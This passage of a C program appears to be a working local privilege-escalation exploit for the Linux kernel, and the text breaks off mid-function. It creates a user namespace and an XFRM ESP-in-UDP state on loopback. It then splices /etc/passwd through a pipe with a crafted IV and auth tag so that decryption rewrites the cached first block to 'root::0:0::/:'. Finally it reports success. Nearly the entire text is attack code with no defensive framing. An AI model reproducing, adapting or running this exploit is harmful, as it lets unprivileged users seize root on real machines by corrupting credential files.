#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <net/if.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define BLOCK_SIZE 16
#define ENCAP_PORT 13337
#define NETLINK_XFRM 6
#define TARGET_PATH "/etc/passwd"
#define TARGET_OFFSET 0

static const uint32_t ESP_SPI = 0x3000beefU;
static const uint32_t ESP_SEQ = 1;
static const uint8_t TARGET_TEXT[BLOCK_SIZE] = {'r', 'o',  'o',  't', ':', ':',
                                                '0', ':',  '0',  ':', ':', '/',
                                                ':', '\n', '\n', '\n'};

static const uint8_t ENC_KEY[BLOCK_SIZE] = {
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
};

static const uint8_t AUTH_KEY[32] = {
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa,
    0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
    0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
};

static void die(const char* fmt, ...) {
  va_list ap;

  va_start(ap, fmt);
  vfprintf(stderr, fmt, ap);
  va_end(ap);
  fputc('\n', stderr);
  exit(EXIT_FAILURE);
}

static void die_errno(const char* what) {
  die("%s: %s", what, strerror(errno));
}

static void xwrite(int fd, const void* buf, size_t len, const char* what) {
  const uint8_t* p = buf;

  while (len) {
    ssize_t wrote = write(fd, p, len);

    if (wrote < 0) {
      if (errno == EINTR) continue;
      die_errno(what);
    }
    if (wrote == 0) die("%s: short write", what);

    p += wrote;
    len -= (size_t)wrote;
  }
}

static void write_text_file(const char* path, const char* text) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);

  if (fd < 0) die_errno(path);

  xwrite(fd, text, strlen(text), path);

  if (close(fd) < 0) die_errno("close");
}

static void hex_dump(const char* label, const uint8_t* buf, size_t len) {
  size_t i;

  printf("%s (%zu bytes):", label, len);
  for (i = 0; i < len; i++) printf(" %02x", buf[i]);
  putchar('\n');
}

static uint32_t load_be32(const uint8_t* p) {
  return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
         ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static void store_be32(uint8_t* p, uint32_t v) {
  p[0] = (uint8_t)(v >> 24);
  p[1] = (uint8_t)(v >> 16);
  p[2] = (uint8_t)(v >> 8);
  p[3] = (uint8_t)v;
}

static void nanosleep_ms(long ms) {
  struct timespec ts;

  ts.tv_sec = ms / 1000;
  ts.tv_nsec = (ms % 1000) * 1000000L;
  while (nanosleep(&ts, &ts) < 0) {
    if (errno != EINTR) die_errno("nanosleep");
  }
}

static void set_lo_up(void) {
  int fd;
  struct ifreq ifr;

  fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) die_errno("socket(AF_INET)");

  memset(&ifr, 0, sizeof(ifr));
  snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");

  if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) die_errno("SIOCGIFFLAGS(lo)");

  ifr.ifr_flags |= IFF_UP;

  if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) die_errno("SIOCSIFFLAGS(lo)");

  close(fd);
}

static int addattr_l(struct nlmsghdr* nlh, size_t maxlen, uint16_t type,
                     const void* data, size_t data_len) {
  size_t len = NLA_HDRLEN + data_len;
  size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(len);
  struct nlattr* nla;

  if (total > maxlen) return -1;

  nla = (struct nlattr*)((uint8_t*)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
  nla->nla_type = type;
  nla->nla_len = (uint16_t)len;
  memcpy((uint8_t*)nla + NLA_HDRLEN, data, data_len);
  memset((uint8_t*)nla + len, 0, NLA_ALIGN(len) - len);
  nlh->nlmsg_len = (uint32_t)total;
  return 0;
}

static void netlink_get_ack(int fd) {
  uint8_t buf[4096];
  ssize_t len = recv(fd, buf, sizeof(buf), 0);
  struct nlmsghdr* nlh;

  if (len < 0) die_errno("recv(netlink)");

  for (nlh = (struct nlmsghdr*)buf; NLMSG_OK(nlh, (unsigned int)len);
       nlh = NLMSG_NEXT(nlh, len)) {
    if (nlh->nlmsg_type == NLMSG_ERROR) {
      struct nlmsgerr* err = NLMSG_DATA(nlh);

      if (err->error) {
        errno = -err->error;
        die_errno("XFRM_MSG_NEWSA");
      }
      return;
    }
  }

  die("missing netlink ACK");
}

static void install_xfrm_state(void) {
  struct {
    struct nlmsghdr nlh;
    struct xfrm_usersa_info info;
    uint8_t attrs[512];
  } req;
  struct {
    struct xfrm_algo alg;
    uint8_t key[sizeof(ENC_KEY)];
  } crypt;
  struct {
    struct xfrm_algo_auth alg;
    uint8_t key[sizeof(AUTH_KEY)];
  } auth;
  struct xfrm_encap_tmpl encap;
  struct sockaddr_nl local;
  struct sockaddr_nl peer;
  int fd;
  struct in_addr loopback;

  memset(&req, 0, sizeof(req));
  memset(&crypt, 0, sizeof(crypt));
  memset(&auth, 0, sizeof(auth));
  memset(&encap, 0, sizeof(encap));
  memset(&local, 0, sizeof(local));
  memset(&peer, 0, sizeof(peer));

  if (inet_pton(AF_INET, "127.0.0.1", &loopback) != 1)
    die("inet_pton failed for loopback");

  req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.info));
  req.nlh.nlmsg_type = XFRM_MSG_NEWSA;
  req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
  req.nlh.nlmsg_seq = 1;

  req.info.sel.family = AF_INET;
  req.info.sel.prefixlen_d = 32;
  req.info.sel.prefixlen_s = 32;
  req.info.sel.daddr.a4 = loopback.s_addr;
  req.info.sel.saddr.a4 = loopback.s_addr;
  req.info.id.daddr.a4 = loopback.s_addr;
  req.info.id.spi = htonl(ESP_SPI);
  req.info.id.proto = IPPROTO_ESP;
  req.info.saddr.a4 = loopback.s_addr;
  req.info.lft.soft_byte_limit = XFRM_INF;
  req.info.lft.hard_byte_limit = XFRM_INF;
  req.info.lft.soft_packet_limit = XFRM_INF;
  req.info.lft.hard_packet_limit = XFRM_INF;
  req.info.family = AF_INET;
  req.info.mode = XFRM_MODE_TRANSPORT;
  req.info.seq = 1;

  snprintf(crypt.alg.alg_name, sizeof(crypt.alg.alg_name), "cbc(aes)");
  crypt.alg.alg_key_len = sizeof(ENC_KEY) * 8U;
  memcpy(crypt.key, ENC_KEY, sizeof(ENC_KEY));
  if (addattr_l(&req.nlh, sizeof(req), XFRMA_ALG_CRYPT, &crypt,
                sizeof(struct xfrm_algo) + sizeof(ENC_KEY)) < 0)
    die("failed to add XFRMA_ALG_CRYPT");

  snprintf(auth.alg.alg_name, sizeof(auth.alg.alg_name), "hmac(sha256)");
  auth.alg.alg_key_len = sizeof(AUTH_KEY) * 8U;
  auth.alg.alg_trunc_len = 128;
  memcpy(auth.key, AUTH_KEY, sizeof(AUTH_KEY));
  if (addattr_l(&req.nlh, sizeof(req), XFRMA_ALG_AUTH_TRUNC, &auth,
                sizeof(struct xfrm_algo_auth) + sizeof(AUTH_KEY)) < 0)
    die("failed to add XFRMA_ALG_AUTH_TRUNC");

  encap.encap_type = UDP_ENCAP_ESPINUDP;
  encap.encap_sport = htons(ENCAP_PORT);
  encap.encap_dport = htons(ENCAP_PORT);
  encap.encap_oa.a4 = 0;
  if (addattr_l(&req.nlh, sizeof(req), XFRMA_ENCAP, &encap, sizeof(encap)) < 0)
    die("failed to add XFRMA_ENCAP");

  fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
  if (fd < 0) die_errno("socket(AF_NETLINK)");

  local.nl_family = AF_NETLINK;
  local.nl_pid = (uint32_t)getpid();
  if (bind(fd, (struct sockaddr*)&local, sizeof(local)) < 0)
    die_errno("bind(netlink)");

  peer.nl_family = AF_NETLINK;
  if (connect(fd, (struct sockaddr*)&peer, sizeof(peer)) < 0)
    die_errno("connect(netlink)");

  xwrite(fd, &req, req.nlh.nlmsg_len, "send XFRM_MSG_NEWSA");
  netlink_get_ack(fd);

  close(fd);
}

static void write_proc_map(pid_t pid, const char* name, const char* text) {
  char path[128];

  snprintf(path, sizeof(path), "/proc/%ld/%s", (long)pid, name);

  if (!strcmp(name, "setgroups")) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);

    if (fd < 0) {
      if (errno == ENOENT) return;
      die_errno(path);
    }
    xwrite(fd, text, strlen(text), path);
    if (close(fd) < 0) die_errno(path);
    return;
  }

  write_text_file(path, text);
}

static void setup_child_uid_gid_map(pid_t pid) {
  char map[128];

  write_proc_map(pid, "setgroups", "deny");

  snprintf(map, sizeof(map), "0 %u 1\n", (unsigned int)getuid());
  write_proc_map(pid, "uid_map", map);

  snprintf(map, sizeof(map), "0 %u 1\n", (unsigned int)getgid());
  write_proc_map(pid, "gid_map", map);
}

static void wait_for_child_signal(int fd, const char* what) {
  char ch;
  ssize_t got;

  do {
    got = read(fd, &ch, 1);
  } while (got < 0 && errno == EINTR);

  if (got < 0) die_errno(what);
  if (got == 0) die("%s: unexpected EOF", what);
}

static void send_child_signal(int fd, const char* what) {
  char ch = '1';

  xwrite(fd, &ch, 1, what);
}

static void splice_exact_from_file(int file_fd, off_t start, int pipe_w,
                                   size_t len) {
  loff_t off = start;

  while (len) {
    ssize_t moved = splice(file_fd, &off, pipe_w, NULL, len, 0);

    if (moved < 0) {
      if (errno == EINTR) continue;
      die_errno("splice(file->pipe)");
    }
    if (moved == 0) die("splice(file->pipe): short splice");
    len -= (size_t)moved;
  }
}

static void splice_exact_fd(int src_fd, int dst_fd, size_t len) {
  while (len) {
    ssize_t moved = splice(src_fd, NULL, dst_fd, NULL, len, 0);

    if (moved < 0) {
      if (errno == EINTR) continue;
      die_errno("splice(pipe->socket)");
    }
    if (moved == 0) die("splice(pipe->socket): short splice");
    len -= (size_t)moved;
  }
}

static const uint8_t aes_sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b,
    0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26,
    0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2,
    0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed,
    0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f,
    0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec,
    0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14,
    0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d,
    0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f,
    0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11,
    0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f,
    0xb0, 0x54, 0xbb, 0x16,
};

static const uint8_t aes_inv_sbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e,
    0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
    0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32,
    0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49,
    0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
    0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50,
    0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05,
    0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
    0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41,
    0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8,
    0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
    0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b,
    0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59,
    0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
    0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d,
    0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63,
    0x55, 0x21, 0x0c, 0x7d,
};

static const uint8_t aes_rcon[11] = {
    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36,
};

static uint8_t gf_mul(uint8_t a, uint8_t b) {
  uint8_t out = 0;
  int i;

  for (i = 0; i < 8; i++) {
    if (b & 1) out ^= a;
    b >>= 1;
    a = (uint8_t)((a << 1) ^ ((a & 0x80) ? 0x1b : 0x00));
  }

  return out;
}

static void aes_key_expand(const uint8_t key[BLOCK_SIZE],
                           uint8_t round_keys[176]) {
  static const int key_words = 4;
  static const int total_words = 44;
  int word;

  memcpy(round_keys, key, BLOCK_SIZE);

  for (word = key_words; word < total_words; word++) {
    uint8_t temp[4];
    int i;

    memcpy(temp, &round_keys[(word - 1) * 4], sizeof(temp));

    if (word % key_words == 0) {
      uint8_t t = temp[0];

      temp[0] = aes_sbox[temp[1]];
      temp[1] = aes_sbox[temp[2]];
      temp[2] = aes_sbox[temp[3]];
      temp[3] = aes_sbox[t];
      temp[0] ^= aes_rcon[word / key_words];
    }

    for (i = 0; i < 4; i++)
      round_keys[word * 4 + i] =
          round_keys[(word - key_words) * 4 + i] ^ temp[i];
  }
}

static void aes_add_round_key(uint8_t state[BLOCK_SIZE],
                              const uint8_t* round_key) {
  int i;

  for (i = 0; i < BLOCK_SIZE; i++) state[i] ^= round_key[i];
}

static void aes_inv_sub_bytes(uint8_t state[BLOCK_SIZE]) {
  int i;

  for (i = 0; i < BLOCK_SIZE; i++) state[i] = aes_inv_sbox[state[i]];
}

static void aes_inv_shift_rows(uint8_t state[BLOCK_SIZE]) {
  uint8_t t;

  t = state[13];
  state[13] = state[9];
  state[9] = state[5];
  state[5] = state[1];
  state[1] = t;

  t = state[2];
  state[2] = state[10];
  state[10] = t;
  t = state[6];
  state[6] = state[14];
  state[14] = t;

  t = state[3];
  state[3] = state[7];
  state[7] = state[11];
  state[11] = state[15];
  state[15] = t;
}

static void aes_inv_mix_columns(uint8_t state[BLOCK_SIZE]) {
  int col;

  for (col = 0; col < 4; col++) {
    uint8_t a = state[col * 4 + 0];
    uint8_t b = state[col * 4 + 1];
    uint8_t c = state[col * 4 + 2];
    uint8_t d = state[col * 4 + 3];

    state[col * 4 + 0] =
        gf_mul(a, 0x0e) ^ gf_mul(b, 0x0b) ^ gf_mul(c, 0x0d) ^ gf_mul(d, 0x09);
    state[col * 4 + 1] =
        gf_mul(a, 0x09) ^ gf_mul(b, 0x0e) ^ gf_mul(c, 0x0b) ^ gf_mul(d, 0x0d);
    state[col * 4 + 2] =
        gf_mul(a, 0x0d) ^ gf_mul(b, 0x09) ^ gf_mul(c, 0x0e) ^ gf_mul(d, 0x0b);
    state[col * 4 + 3] =
        gf_mul(a, 0x0b) ^ gf_mul(b, 0x0d) ^ gf_mul(c, 0x09) ^ gf_mul(d, 0x0e);
  }
}

static void aes128_ecb_decrypt_block(const uint8_t key[BLOCK_SIZE],
                                     const uint8_t in[BLOCK_SIZE],
                                     uint8_t out[BLOCK_SIZE]) {
  uint8_t round_keys[176];
  uint8_t state[BLOCK_SIZE];
  int round;

  aes_key_expand(key, round_keys);
  memcpy(state, in, BLOCK_SIZE);

  aes_add_round_key(state, &round_keys[10 * BLOCK_SIZE]);

  for (round = 9; round > 0; round--) {
    aes_inv_shift_rows(state);
    aes_inv_sub_bytes(state);
    aes_add_round_key(state, &round_keys[round * BLOCK_SIZE]);
    aes_inv_mix_columns(state);
  }

  aes_inv_shift_rows(state);
  aes_inv_sub_bytes(state);
  aes_add_round_key(state, round_keys);
  memcpy(out, state, BLOCK_SIZE);
}

struct sha256_ctx {
  uint32_t state[8];
  uint64_t bitlen;
  size_t used;
  uint8_t block[64];
};

static const uint32_t sha256_k[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
    0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
    0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
    0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
    0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
    0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
};

static uint32_t rotr32(uint32_t v, unsigned int n) {
  return (v >> n) | (v << (32 - n));
}

static void sha256_init(struct sha256_ctx* ctx) {
  ctx->state[0] = 0x6a09e667;
  ctx->state[1] = 0xbb67ae85;
  ctx->state[2] = 0x3c6ef372;
  ctx->state[3] = 0xa54ff53a;
  ctx->state[4] = 0x510e527f;
  ctx->state[5] = 0x9b05688c;
  ctx->state[6] = 0x1f83d9ab;
  ctx->state[7] = 0x5be0cd19;
  ctx->bitlen = 0;
  ctx->used = 0;
}

static void sha256_transform(struct sha256_ctx* ctx, const uint8_t block[64]) {
  uint32_t w[64];
  uint32_t a = ctx->state[0];
  uint32_t b = ctx->state[1];
  uint32_t c = ctx->state[2];
  uint32_t d = ctx->state[3];
  uint32_t e = ctx->state[4];
  uint32_t f = ctx->state[5];
  uint32_t g = ctx->state[6];
  uint32_t h = ctx->state[7];
  int i;

  for (i = 0; i < 16; i++) w[i] = load_be32(&block[i * 4]);

  for (i = 16; i < 64; i++) {
    uint32_t s0 =
        rotr32(w[i - 15], 7) ^ rotr32(w[i - 15], 18) ^ (w[i - 15] >> 3);
    uint32_t s1 =
        rotr32(w[i - 2], 17) ^ rotr32(w[i - 2], 19) ^ (w[i - 2] >> 10);
    w[i] = w[i - 16] + s0 + w[i - 7] + s1;
  }

  for (i = 0; i < 64; i++) {
    uint32_t s1 = rotr32(e, 6) ^ rotr32(e, 11) ^ rotr32(e, 25);
    uint32_t ch = (e & f) ^ ((~e) & g);
    uint32_t temp1 = h + s1 + ch + sha256_k[i] + w[i];
    uint32_t s0 = rotr32(a, 2) ^ rotr32(a, 13) ^ rotr32(a, 22);
    uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
    uint32_t temp2 = s0 + maj;

    h = g;
    g = f;
    f = e;
    e = d + temp1;
    d = c;
    c = b;
    b = a;
    a = temp1 + temp2;
  }

  ctx->state[0] += a;
  ctx->state[1] += b;
  ctx->state[2] += c;
  ctx->state[3] += d;
  ctx->state[4] += e;
  ctx->state[5] += f;
  ctx->state[6] += g;
  ctx->state[7] += h;
}

static void sha256_update(struct sha256_ctx* ctx, const void* data_,
                          size_t len) {
  const uint8_t* data = data_;

  while (len) {
    size_t take = sizeof(ctx->block) - ctx->used;

    if (take > len) take = len;

    memcpy(&ctx->block[ctx->used], data, take);
    ctx->used += take;
    data += take;
    len -= take;

    if (ctx->used == sizeof(ctx->block)) {
      sha256_transform(ctx, ctx->block);
      ctx->bitlen += 512;
      ctx->used = 0;
    }
  }
}

static void sha256_final(struct sha256_ctx* ctx, uint8_t out[32]) {
  size_t i;

  ctx->bitlen += (uint64_t)ctx->used * 8U;
  ctx->block[ctx->used++] = 0x80;

  if (ctx->used > 56) {
    while (ctx->used < 64) ctx->block[ctx->used++] = 0;
    sha256_transform(ctx, ctx->block);
    ctx->used = 0;
  }

  while (ctx->used < 56) ctx->block[ctx->used++] = 0;

  for (i = 0; i < 8; i++)
    ctx->block[56 + i] = (uint8_t)(ctx->bitlen >> ((7 - i) * 8));

  sha256_transform(ctx, ctx->block);

  for (i = 0; i < 8; i++) store_be32(&out[i * 4], ctx->state[i]);
}

static void hmac_sha256(const uint8_t* key, size_t key_len, const uint8_t* data,
                        size_t data_len, uint8_t out[32]) {
  struct sha256_ctx ctx;
  uint8_t k0[64];
  uint8_t ipad[64];
  uint8_t opad[64];
  uint8_t digest[32];
  size_t i;

  memset(k0, 0, sizeof(k0));

  if (key_len > sizeof(k0)) {
    sha256_init(&ctx);
    sha256_update(&ctx, key, key_len);
    sha256_final(&ctx, digest);
    memcpy(k0, digest, sizeof(digest));
  } else {
    memcpy(k0, key, key_len);
  }

  for (i = 0; i < sizeof(k0); i++) {
    ipad[i] = k0[i] ^ 0x36;
    opad[i] = k0[i] ^ 0x5c;
  }

  sha256_init(&ctx);
  sha256_update(&ctx, ipad, sizeof(ipad));
  sha256_update(&ctx, data, data_len);
  sha256_final(&ctx, digest);

  sha256_init(&ctx);
  sha256_update(&ctx, opad, sizeof(opad));
  sha256_update(&ctx, digest, sizeof(digest));
  sha256_final(&ctx, out);
}

static void validate_target(void) {
  struct stat st;

  if (stat(TARGET_PATH, &st) < 0) die_errno("stat target");

  if (!S_ISREG(st.st_mode))
    die("target is not a regular file: %s", TARGET_PATH);

  if ((uintmax_t)TARGET_OFFSET + BLOCK_SIZE > (uintmax_t)st.st_size)
    die("target range [%lld, %lld) is outside file size %lld",
        (long long)TARGET_OFFSET, (long long)(TARGET_OFFSET + BLOCK_SIZE),
        (long long)st.st_size);
}

static int run_poc_once(void) {
  uint8_t ciphertext[BLOCK_SIZE];
  uint8_t decrypted[BLOCK_SIZE];
  uint8_t iv[BLOCK_SIZE];
  uint8_t aad[8];
  uint8_t hmac_input[8 + BLOCK_SIZE + BLOCK_SIZE];
  uint8_t hmac_out[32];
  uint8_t tag[16];
  uint8_t prefix[sizeof(aad) + BLOCK_SIZE];
  uint8_t cached[BLOCK_SIZE];
  struct sockaddr_in addr;
  int target_splice = -1;
  int target_read = -1;
  int encap_sock = -1;
  int sender = -1;
  int pipefd[2] = {-1, -1};
  size_t i;
  int encap = UDP_ENCAP_ESPINUDP;

  validate_target();

  target_splice = open(TARGET_PATH, O_RDONLY | O_CLOEXEC);
  if (target_splice < 0) die_errno("open target_splice");

  target_read = open(TARGET_PATH, O_RDONLY | O_CLOEXEC);
  if (target_read < 0) die_errno("open target_read");

  if (pread(target_read, ciphertext, sizeof(ciphertext), TARGET_OFFSET) !=
      (ssize_t)sizeof(ciphertext))
    die_errno("pread ciphertext");

  store_be32(&aad[0], ESP_SPI);
  store_be32(&aad[4], ESP_SEQ);

  aes128_ecb_decrypt_block(ENC_KEY, ciphertext, decrypted);
  for (i = 0; i < BLOCK_SIZE; i++) iv[i] = decrypted[i] ^ TARGET_TEXT[i];

  memcpy(hmac_input, aad, sizeof(aad));
  memcpy(hmac_input + sizeof(aad), iv, sizeof(iv));
  memcpy(hmac_input + sizeof(aad) + sizeof(iv), ciphertext, sizeof(ciphertext));
  hmac_sha256(AUTH_KEY, sizeof(AUTH_KEY), hmac_input, sizeof(hmac_input),
              hmac_out);
  memcpy(tag, hmac_out, sizeof(tag));

  encap_sock = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (encap_sock < 0) die_errno("socket encap");

  if (setsockopt(encap_sock, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0)
    die_errno("setsockopt(UDP_ENCAP)");

  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(ENCAP_PORT);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  if (bind(encap_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
    die_errno("bind encap socket");

  sender = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (sender < 0) die_errno("socket sender");

  if (connect(sender, (struct sockaddr*)&addr, sizeof(addr)) < 0)
    die_errno("connect sender");

  if (pipe(pipefd) < 0) die_errno("pipe");

  memcpy(prefix, aad, sizeof(aad));
  memcpy(prefix + sizeof(aad), iv, sizeof(iv));
  xwrite(pipefd[1], prefix, sizeof(prefix), "write ESP header/IV");
  splice_exact_from_file(target_splice, TARGET_OFFSET, pipefd[1], BLOCK_SIZE);
  xwrite(pipefd[1], tag, sizeof(tag), "write auth tag");
  splice_exact_fd(pipefd[0], sender, sizeof(prefix) + BLOCK_SIZE + sizeof(tag));

  nanosleep_ms(200);

  if (pread(target_read, cached, sizeof(cached), TARGET_OFFSET) !=
      (ssize_t)sizeof(cached))
    die_errno("pread cached");

  hex_dump("original ciphertext block", ciphertext, sizeof(ciphertext));
  hex_dump("attacker-chosen IV", iv, sizeof(iv));
  hex_dump("computed auth tag", tag, sizeof(tag));
  hex_dump("cached block after trigger", cached, sizeof(cached));

  if (memcmp(cached, TARGET_TEXT, BLOCK_SIZE) != 0)
    die("cached target slice did not become the chosen replacement bytes");

  printf(
      "SUCCESS: pagecache for %s now serves the chosen %d-byte block at offset "
      "%lld.\n",
      TARGET_PATH, BLOCK_SIZE, (long long)TARGET_OFFSET);

  close(pipefd[0]);
  close(pipefd[1]);
  close(sender);
  close(encap_sock);
  close(target_read);
  close(target_splice);
  return 0;
}

static int child_main(void) {
  set_lo_up();
  install_xfrm_state();
  return run_poc_once();
}

static int wait_child(pid_t pid) {
  int status;

